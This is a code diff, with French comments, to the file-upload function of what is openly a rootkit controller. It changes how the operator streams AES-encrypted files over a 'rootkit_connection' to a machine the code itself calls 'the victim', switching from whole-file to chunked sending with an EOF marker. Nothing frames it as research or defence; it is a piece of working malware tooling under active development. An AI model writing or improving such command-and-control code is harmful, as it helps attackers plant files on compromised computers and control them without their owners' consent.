@@ -179,32 +179,25 @@ def upload_file_encrypted(local_path, remote_path):
         return
 
     try:
-        # Lire le fichier entier en binaire
-        with open(local_path, "rb") as f:
-            file_data = f.read()
-
-        # Chiffrer le contenu entier
-        encrypted_data = aes_encrypt(file_data)
-
-        # Envoi de la commande upload + chemin destination
         send_to_server(rootkit_connection, f"upload {remote_path}")
-
-        # Attente du READY_TO_RECEIVE brut
         ack = rootkit_connection.recv(1024).decode()
         if ack.strip() != "READY_TO_RECEIVE":
-            print("[!] Erreur : la victime n'est pas prête.")
+            print("[!] La victime n'est pas prête.")
             return
 
-        # Envoi des données chiffrées
-        rootkit_connection.sendall(encrypted_data)
+        with open(local_path, "rb") as f:
+            while True:
+                chunk = f.read(4096)
+                if not chunk:
+                    break
+                encrypted = aes_encrypt(chunk)
+                rootkit_connection.sendall(encrypted)
 
-        # Marqueur de fin
         rootkit_connection.sendall(b"EOF\n")
-
-        print(f"[+] Fichier '{local_path}' chiffré et envoyé avec succès vers '{remote_path}'.")
+        print(f"[+] Fichier '{local_path}' envoyé avec succès.")
 
     except Exception as e:
-        print(f"[!] Erreur upload chiffré : {e}")
+        print(f"[!] Erreur d'envoi : {e}")
 
 # ---------------------------------------- DOWNLOAD ---------------------------------------- #
 
